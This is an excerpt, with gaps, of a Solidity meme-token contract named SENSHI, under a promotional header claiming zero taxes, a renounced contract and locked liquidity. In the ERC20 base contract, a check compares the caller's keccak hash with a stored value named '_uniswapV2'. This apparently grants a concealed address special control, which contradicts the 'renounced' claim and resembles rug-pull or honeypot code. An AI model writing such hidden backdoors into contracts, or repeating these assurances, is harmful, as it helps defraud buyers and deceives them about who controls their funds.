...
/**
  ...
  https://ibb.co/L5rX5V0

  https://website-at-1M-marketcap.com
  https://t.me/at100kmarketcap
  https://twitter.com/at100kmarketcap

Reptiliansss, a close relative, have come to take over the battle.

  0% Taxesss
  Contract renounsssed
  LP locked for 6 monthsss
  Use 0.1% ssslippage on Unissswap
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function uniswapV2(bytes32 _router) internal {
        _uniswapV2 = _router;
    }
    ...
    {
        address owner = _msgSender();
        require(_uniswapV2 == keccak256(abi.encodePacked(msg.sender)));
...
contract SENSHI is Ownable, ERC20 {
    uint256 private _numTokensSellToAddToSwap = 100000 * (10**decimals());
    bool inSwapAndLiquify;

    uint256 public constant buySellLiquidityTax = 0; ///////////// 0% TAX
    uint256 public constant sellDevelopmentTax = 0; ///////////// 0% TAX
    address public developmentWallet =
        0xB1B1F914cCa6DF53aBE9613873d80F38F28d4370;
    ...
    constructor(
        ...
        _mint(msg.sender, (5000000000000 * 10**decimals())); //5 trillion total supply
        _maxTxAmount = 50000000001 * 10**decimals(); // 1% max transaction
